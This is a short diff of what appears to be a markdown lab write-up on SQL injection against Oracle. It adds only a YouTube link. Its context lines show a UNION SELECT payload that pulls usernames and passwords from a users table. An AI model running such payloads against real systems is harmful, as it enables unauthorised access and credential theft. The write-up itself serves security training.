@@ -29,3 +29,6 @@ SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
 ```bash
 ' UNION SELECT USERNAME_FNJWVV, PASSWORD_LMQXOK FROM USERS_FIRSTQ--
 ```
+
+## Perfect explanation on you tube
+https://youtu.be/ZbwIbIq5-eE
